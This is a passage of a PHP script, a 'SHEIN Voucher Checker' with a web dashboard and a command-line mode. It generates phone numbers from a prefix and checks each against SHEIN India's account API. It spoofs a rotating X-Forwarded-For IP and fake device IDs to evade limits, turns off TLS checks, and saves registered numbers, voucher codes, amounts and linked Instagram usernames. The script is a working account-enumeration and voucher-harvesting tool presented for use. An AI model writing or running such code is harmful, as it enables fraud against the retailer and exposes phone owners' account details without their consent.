    if (isset($_POST['base_number']) && !empty($_POST['base_number'])) {
        $baseNumber = preg_replace('/[^0-9]/', '', $_POST['base_number']);
        
        // Store in session for the checker to use
        session_start();
        $_SESSION['base_number'] = $baseNumber;
        $_SESSION['checker_running'] = true;
        
        // Redirect to avoid form resubmission
        header('Location: ' . $_SERVER['PHP_SELF'] . '?running=1');
        exit;
    }
    
    // Check if we should show the running interface
    session_start();
    $isRunning = isset($_SESSION['checker_running']) && $_SESSION['checker_running'] === true;
    $storedBaseNumber = $_SESSION['base_number'] ?? '';
    
    // If user wants to stop
    if (isset($_GET['stop'])) {
        $_SESSION['checker_running'] = false;
        $isRunning = false;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // HTML Interface
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SHEIN Voucher Checker</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
                color: #333;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            
            .header {
                background: white;
                border-radius: 15px 15px 0 0;
                padding: 25px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                margin-bottom: 20px;
            }
            
            .header h1 {
                font-size: 28px;
                margin-bottom: 10px;
                color: #4a5568;
            }
            
            .header p {
                color: #718096;
                font-size: 16px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }
            
            .stat-card {
                background: white;
                padding: 20px;
                border-radius: 12px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
                transition: transform 0.3s;
            }
            
            .stat-card:hover {
                transform: translateY(-5px);
            }
            
            .stat-card .label {
                font-size: 14px;
                color: #718096;
                margin-bottom: 8px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .stat-card .value {
                font-size: 32px;
                font-weight: bold;
                color: #4a5568;
            }
            
            .stat-card.total { border-left: 4px solid #4299e1; }
            .stat-card.not-registered { border-left: 4px solid #f56565; }
            .stat-card.registered { border-left: 4px solid #9f7aea; }
            .stat-card.vouchers { border-left: 4px solid #48bb78; }
            .stat-card.retries { border-left: 4px solid #ecc94b; }
            .stat-card.errors { border-left: 4px solid #fc8181; }
            
            .control-panel {
                background: white;
                border-radius: 12px;
                padding: 25px;
                margin-bottom: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            
            .input-group {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }
            
            .input-group input {
                flex: 1;
                min-width: 250px;
                padding: 12px 15px;
                border: 2px solid #e2e8f0;
                border-radius: 8px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            
            .input-group input:focus {
                outline: none;
                border-color: #667eea;
            }
            
            .btn {
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
                text-decoration: none;
                display: inline-block;
            }
            
            .btn-primary {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            
            .btn-primary:hover {
                transform: translateY(-2px);
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            }
            
            .btn-danger {
                background: #f56565;
                color: white;
            }
            
            .btn-danger:hover {
                background: #e53e3e;
                transform: translateY(-2px);
            }
            
            .btn-success {
                background: #48bb78;
                color: white;
            }
            
            .btn-success:hover {
                background: #38a169;
                transform: translateY(-2px);
            }
            
            .tables-container {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 20px;
            }
            
            .table-wrapper {
                background: white;
                border-radius: 12px;
                overflow: hidden;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            
            .table-header {
                background: #f7fafc;
                padding: 15px 20px;
                border-bottom: 2px solid #e2e8f0;
            }
            
            .table-header h3 {
                color: #4a5568;
                font-size: 18px;
            }
            
            .table-scroll {
                max-height: 400px;
                overflow-y: auto;
            }
            
            table {
                width: 100%;
                border-collapse: collapse;
            }
            
            th {
                background: #edf2f7;
                padding: 12px;
                text-align: left;
                font-size: 12px;
                text-transform: uppercase;
                color: #718096;
                position: sticky;
                top: 0;
                z-index: 10;
            }
            
            td {
                padding: 12px;
                border-bottom: 1px solid #e2e8f0;
                font-size: 14px;
            }
            
            .status-success { color: #48bb78; font-weight: 600; }
            .status-error { color: #f56565; font-weight: 600; }
            .status-warning { color: #ecc94b; font-weight: 600; }
            .status-info { color: #4299e1; font-weight: 600; }
            
            .vouchers-section {
                background: white;
                border-radius: 12px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            
            .voucher-item {
                display: flex;
                align-items: center;
                padding: 15px;
                border-bottom: 1px solid #e2e8f0;
            }
            
            .voucher-item:last-child {
                border-bottom: none;
            }
            
            .voucher-badge {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 8px 15px;
                border-radius: 20px;
                font-size: 14px;
                font-weight: 600;
                margin-right: 15px;
            }
            
            .voucher-details {
                flex: 1;
            }
            
            .voucher-details strong {
                color: #4a5568;
                font-size: 16px;
            }
            
            .voucher-details .meta {
                color: #718096;
                font-size: 13px;
                margin-top: 4px;
            }
            
            .voucher-code {
                background: #edf2f7;
                padding: 5px 10px;
                border-radius: 5px;
                font-family: monospace;
                font-size: 14px;
                color: #4a5568;
            }
            
            .alert {
                padding: 15px 20px;
                border-radius: 8px;
                margin-bottom: 20px;
            }
            
            .alert-info {
                background: #ebf8ff;
                border-left: 4px solid #4299e1;
                color: #2b6cb0;
            }
            
            .alert-warning {
                background: #feebc8;
                border-left: 4px solid #ed8936;
                color: #c05621;
            }
            
            @media (max-width: 768px) {
                .tables-container {
                    grid-template-columns: 1fr;
                }
                
                .input-group {
                    flex-direction: column;
                }
                
                .btn {
                    width: 100%;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔍 SHEIN Voucher Checker</h1>
                <p>Automated phone number checker with IP rotation and retry logic for REAL errors only</p>
            </div>
            
            <?php if ($isRunning): ?>
            <div class="alert alert-info">
                <strong>⚠️ Checker is currently running</strong> for base number: <?php echo htmlspecialchars($storedBaseNumber); ?>
                <br>
                <small>Results are being saved to files. This page auto-refreshes every 5 seconds.</small>
                <div style="margin-top: 10px;">
                    <a href="?stop=1" class="btn btn-danger" style="font-size: 14px; padding: 8px 20px;">🛑 Stop Checker</a>
                    <a href="?export=csv" class="btn btn-success" style="font-size: 14px; padding: 8px 20px; margin-left: 10px;">📥 Export CSV</a>
                </div>
            </div>
            <?php endif; ?>
            
            <div class="stats-grid">
                <?php
                // Load stats from files
                $stats = [
                    'total' => 0,
                    'not_registered' => 0,
                    'registered' => 0,
                    'vouchers' => 0,
                    'retries' => 0,
                    'errors' => 0
                ];
                
                if (file_exists('checked_numbers.json')) {
                    $checked = json_decode(file_get_contents('checked_numbers.json'), true) ?: [];
                    $stats['total'] = count($checked);
                }
                
                if (file_exists('registered_numbers.json')) {
                    $registered = json_decode(file_get_contents('registered_numbers.json'), true) ?: [];
                    $stats['registered'] = count($registered);
                }
                
                if (file_exists('voucher_numbers.json')) {
                    $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
                    $stats['vouchers'] = count($vouchers);
                }
                
                if (file_exists('retry_queue.json')) {
                    $retryQueue = json_decode(file_get_contents('retry_queue.json'), true) ?: [];
                    $stats['retries'] = count($retryQueue);
                }
                
                $stats['not_registered'] = $stats['total'] - $stats['registered'];
                ?>
                
                <div class="stat-card total">
                    <div class="label">Total Processed</div>
                    <div class="value"><?php echo number_format($stats['total']); ?></div>
                </div>
                
                <div class="stat-card not-registered">
                    <div class="label">Not Registered</div>
                    <div class="value"><?php echo number_format($stats['not_registered']); ?></div>
                </div>
                
                <div class="stat-card registered">
                    <div class="label">Registered</div>
                    <div class="value"><?php echo number_format($stats['registered']); ?></div>
                </div>
                
                <div class="stat-card vouchers">
                    <div class="label">Vouchers Found</div>
                    <div class="value"><?php echo number_format($stats['vouchers']); ?></div>
                </div>
                
                <div class="stat-card retries">
                    <div class="label">Pending Retries</div>
                    <div class="value"><?php echo number_format($stats['retries']); ?></div>
                </div>
                
                <div class="stat-card errors">
                    <div class="label">Failed</div>
                    <div class="value">0</div>
                </div>
            </div>
            
            <div class="control-panel">
                <?php if (!$isRunning): ?>
                <form method="POST" class="input-group">
                    <input type="text" name="base_number" placeholder="Enter base number (e.g., 98, 987, 98765)" required 
                           value="<?php echo htmlspecialchars($storedBaseNumber); ?>">
                    <button type="submit" class="btn btn-primary">▶ Start Checker</button>
                </form>
                <?php else: ?>
                <div class="input-group">
                    <input type="text" value="Checker running for: <?php echo htmlspecialchars($storedBaseNumber); ?>" disabled>
                    <a href="?stop=1" class="btn btn-danger">🛑 Stop Checker</a>
                </div>
                <?php endif; ?>
                
                <p style="margin-top: 15px; color: #718096; font-size: 13px;">
                    <strong>Features:</strong> IP rotation per request | 200ms delay | Only REAL errors retried (timeouts, 5xx, empty responses)
                </p>
            </div>
            
            <div class="tables-container">
                <!-- Sent Requests -->
                <div class="table-wrapper">
                    <div class="table-header">
                        <h3>📤 Sent Requests (Last 15)</h3>
                    </div>
                    <div class="table-scroll">
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Number</th>
                                    <th>Step</th>
                                    <th>IP</th>
                                    <th>Data</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                if (file_exists('sent_log.json')) {
                                    $sentLog = json_decode(file_get_contents('sent_log.json'), true) ?: [];
                                    $sentLog = array_slice(array_reverse($sentLog), 0, 15);
                                    
                                    foreach ($sentLog as $entry):
                                ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                    <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
                                    <td>
                                        <span class="status-info"><?php echo htmlspecialchars($entry['step'] ?? ''); ?></span>
                                    </td>
                                    <td><?php echo htmlspecialchars($entry['ip'] ?? ''); ?></td>
                                    <td><?php echo htmlspecialchars($entry['data'] ?? ''); ?></td>
                                </tr>
                                <?php
                                    endforeach;
                                } else {
                                    echo '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
                                }
                                ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <!-- Received Responses -->
                <div class="table-wrapper">
                    <div class="table-header">
                        <h3>📥 Received Responses (Last 15)</h3>
                    </div>
                    <div class="table-scroll">
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Number</th>
                                    <th>Status</th>
                                    <th>Voucher</th>
                                    <th>Amount</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                if (file_exists('received_log.json')) {
                                    $receivedLog = json_decode(file_get_contents('received_log.json'), true) ?: [];
                                    $receivedLog = array_slice(array_reverse($receivedLog), 0, 15);
                                    
                                    foreach ($receivedLog as $entry):
                                        $statusClass = '';
                                        if ($entry['status'] == 'success') $statusClass = 'status-success';
                                        elseif ($entry['status'] == 'not_registered') $statusClass = 'status-error';
                                        elseif ($entry['status'] == 'retry') $statusClass = 'status-warning';
                                        else $statusClass = 'status-info';
                                ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                    <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
                                    <td class="<?php echo $statusClass; ?>">
                                        <?php 
                                        $status = $entry['status'] ?? '';
                                        if ($status == 'success') echo '✅ VOUCHER FOUND';
                                        elseif ($status == 'not_registered') echo '❌ NOT REGISTERED';
                                        elseif ($status == 'registered') echo '📱 REGISTERED';
                                        elseif ($status == 'token_obtained') echo '🔑 TOKEN OK';
                                        elseif ($status == 'retry') echo '🔄 RETRY (' . ($entry['retryCount'] ?? 1) . '/' . MAX_RETRIES . ')';
                                        else echo '⚠ ' . strtoupper($status);
                                        ?>
                                    </td>
                                    <td><?php echo htmlspecialchars($entry['voucher'] ?? '-'); ?></td>
                                    <td><?php echo $entry['amount'] ? '₹' . htmlspecialchars($entry['amount']) : '-'; ?></td>
                                </tr>
                                <?php
                                    endforeach;
                                } else {
                                    echo '<tr><td colspan="5" style="text-align: center;">No data yet</td></tr>';
                                }
                                ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            
            <!-- Recent Vouchers -->
            <div class="vouchers-section">
                <h3 style="margin-bottom: 15px; color: #4a5568;">🎟 Recent Vouchers Found</h3>
                
                <?php
                if (file_exists('voucher_numbers.json')) {
                    $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
                    $recentVouchers = array_slice(array_reverse($vouchers), 0, 5);
                    
                    if (!empty($recentVouchers)):
                        foreach ($recentVouchers as $voucher):
                ?>
                <div class="voucher-item">
                    <span class="voucher-badge">VOUCHER</span>
                    <div class="voucher-details">
                        <strong><?php echo htmlspecialchars($voucher['number']); ?></strong>
                        <div class="meta">
                            Instagram: @<?php echo htmlspecialchars($voucher['username'] ?? 'N/A'); ?> | 
                            Expires: <?php echo htmlspecialchars($voucher['expiry'] ?? 'N/A'); ?>
                        </div>
                    </div>
                    <div style="text-align: right;">
                        <span class="voucher-code"><?php echo htmlspecialchars($voucher['voucher'] ?? 'N/A'); ?></span>
                        <div style="font-weight: bold; color: #48bb78; margin-top: 5px;">₹<?php echo htmlspecialchars($voucher['amount'] ?? '0'); ?></div>
                    </div>
                </div>
                <?php
                        endforeach;
                    else:
                        echo '<p style="color: #718096; text-align: center;">No vouchers found yet</p>';
                    endif;
                }
                ?>
            </div>
            
            <!-- Log Files -->
            <div style="background: white; border-radius: 12px; padding: 15px; margin-top: 20px;">
                <h4 style="color: #4a5568; margin-bottom: 10px;">📁 Saved Files</h4>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <?php
                    $files = ['registered_numbers.txt', 'registered_numbers.json', 'voucher_numbers.txt', 'voucher_numbers.json', 'all_results.json', 'checked_numbers.json'];
                    foreach ($files as $file):
                        if (file_exists($file)):
                    ?>
                    <a href="<?php echo $file; ?>" target="_blank" style="background: #edf2f7; padding: 5px 12px; border-radius: 20px; font-size: 13px; color: #4a5568; text-decoration: none;">
                        📄 <?php echo $file; ?>
                    </a>
                    <?php
                        endif;
                    endforeach;
                    ?>
                </div>
            </div>
        </div>
        
        <?php if ($isRunning): ?>
        <!-- Auto-refresh every 5 seconds when checker is running -->
        <script>
            setTimeout(function() {
                window.location.reload();
            }, 5000);
        </script>
        <?php endif; ?>
    </body>
    </html>
    <?php
    
    // If checker is running, we need to actually run the checker
    if ($isRunning && $storedBaseNumber) {
        // This would be where your main checker loop runs
        // For now, we'll just log that it's running
        // You'll need to adapt your main processing loop to work in web mode
        // This might require using background processes or queue systems
    }
    
    exit;
}

// ============================================================================
// CLI MODE - Original functionality preserved
// ============================================================================
if ($isCli) {
    // Original CLI code continues here exactly as before
    // ... (all your original CLI code remains unchanged)
    
    loadCheckedNumbers();
    loadRetryQueue();

    clearScreen();
    echo COLOR_BOLD . COLOR_CYAN . "╔════════════════════════════════════════════════════════════════════════════════════════════════════╗\n";
    echo "║                    SHEIN VOUCHER CHECKER - RETRY ONLY REAL ERRORS                         ║\n";
    echo "╚════════════════════════════════════════════════════════════════════════════════════════════════════╝\n" . COLOR_RESET . "\n";

    // Display retry queue size on start
    if (!empty($retryQueue)) {
        echo COLOR_YELLOW . "⚠ Found " . count($retryQueue) . " pending retries from previous session (REAL ERRORS only)\n" . COLOR_RESET;
        echo COLOR_YELLOW . "⚠ These will be processed first\n\n" . COLOR_RESET;
    }

    // Get user input (STDIN works fine in CLI)
    echo COLOR_BOLD . "Enter Base Number (any length, will be completed to 10 digits): " . COLOR_RESET;
    $input = trim(fgets(STDIN));
    $baseNumber = preg_replace('/[^0-9]/', '', $input);
    $baseLength = strlen($baseNumber);

    if ($baseLength == 0) {
        die("Please enter at least one digit\n");
    }

    if ($baseLength > 10) {
        $baseNumber = substr($baseNumber, 0, 10);
        echo COLOR_YELLOW . "⚠ Number truncated to 10 digits: {$baseNumber}\n" . COLOR_RESET;
    }

    echo "\n" . COLOR_GREEN . "✓ Starting voucher checker with base: {$baseNumber}" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Numbers will be completed to 10 digits" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Sending requests ONE BY ONE with 200ms delay" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Registered numbers will be SAVED to files" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Voucher numbers will be SAVED to files" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ 'Not Registered' is NOT an error - will NOT be retried" . COLOR_RESET . "\n";
    echo COLOR_GREEN . "✓ Only REAL ERRORS (timeouts, 5xx, empty responses) will be retried up to " . MAX_RETRIES . " times" . COLOR_RESET . "\n\n";

    // Get access token first
    echo "⏳ Obtaining access token... ";
    $ip = randIp();
    $adId = genDeviceId();
    $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];

    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $response = httpCall($url, $data, $headers, "POST", 0);
    $j = json_decode($response['content'], true);
    $access_token = $j['access_token'] ?? null;

    if (!$access_token) {
        die(COLOR_RED . "\n✗ Error generating token\n" . COLOR_RESET);
    }

    echo COLOR_GREEN . "✓ Success!\n\n" . COLOR_RESET;
    sleep(1);

    // Initialize display manager and response handler
    $displayManager = new DisplayManager();
    $responseHandler = new AsyncResponseHandler();
    $displayManager->render();

    $numberCount = 0;

    // Main processing loop
    while (true) {
        // First, process any pending retries (REAL ERRORS only)
        if (!empty($retryQueue)) {
            processRetryQueue($responseHandler, $displayManager, $access_token);
        }
        
        // Generate new unique number
        $attempts = 0;
        $maxAttempts = 100;
        
        do {
            $completeNumber = generateCompleteNumber($baseNumber);
            $attempts++;
            if ($attempts > $maxAttempts) {
                echo COLOR_RED . "⚠ Could not generate enough unique numbers. Exiting.\n" . COLOR_RESET;
                break 2;
            }
        } while (isset($checkedNumbers[$completeNumber]));
        
        $numberCount++;
        
        // Prepare request
        $ip = randIp();
        $adId = genDeviceId();
        
        // Log sent request
        $displayManager->addSent($completeNumber, 'account_check', $ip, "mobile=$completeNumber");
        
        // Create cURL handle for account check
        $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
        $headers = [
            "Authorization: Bearer $access_token",
            "Requestid: account_check",
            "X-Tenant: B2C",
            "Accept: application/json",
            "User-Agent: Android",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Forwarded-For: $ip"
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => "mobileNumber=$completeNumber",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 15
        ]);
        
        // Add to response handler
        $responseHandler->addRequest($completeNumber, $ch, $completeNumber, 'account_check', $ip, "mobile=$completeNumber", 0);
        
        // Check for any pending responses
        $responseHandler->checkResponses($displayManager, $access_token);
        
        // Delay 200ms before next request
        usleep(200000);
        
        // Every 10 requests, give a longer pause and process retries
        if ($numberCount % 10 == 0) {
            echo COLOR_YELLOW . "⏸ Small pause after 10 requests... checking responses and retries\n" . COLOR_RESET;
            for ($i = 0; $i < 5; $i++) {
                $responseHandler->checkResponses($displayManager, $access_token);
                processRetryQueue($responseHandler, $displayManager, $access_token);
                usleep(50000);
            }
        }
    }

    // Handle Ctrl+C gracefully
    if (function_exists('pcntl_signal')) {
        pcntl_signal(SIGINT, function() use ($displayManager) {
            echo "\n\n" . COLOR_BOLD . COLOR_YELLOW . "🛑 Script stopped by user" . COLOR_RESET . "\n";
            echo COLOR_BOLD . "📊 Final Stats - Total Vouchers Found: " . COLOR_GREEN . $displayManager->stats['vouchers'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "📱 Total Numbers Processed: " . COLOR_GREEN . $displayManager->stats['total_processed'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "❌ Not Registered: " . COLOR_RED . $displayManager->stats['not_registered'] . COLOR_RESET . " (NOT retried)" . "\n";
            echo COLOR_BOLD . "📱 Registered: " . COLOR_BLUE . $displayManager->stats['registered'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "🔄 Real Error Retries: " . COLOR_YELLOW . $displayManager->stats['retries'] . COLOR_RESET . "\n";
            echo COLOR_BOLD . "⚠ Final Errors: " . COLOR_RED . $displayManager->stats['errors'] . COLOR_RESET . "\n\n";
            
            displaySavedStats();
            
            $csvFile = exportToCSV();
            if ($csvFile) {
                echo COLOR_GREEN . "\n✅ Exported all vouchers to: " . $csvFile . COLOR_RESET . "\n\n";
            }
            
            exit;
        });
    }
}
?>
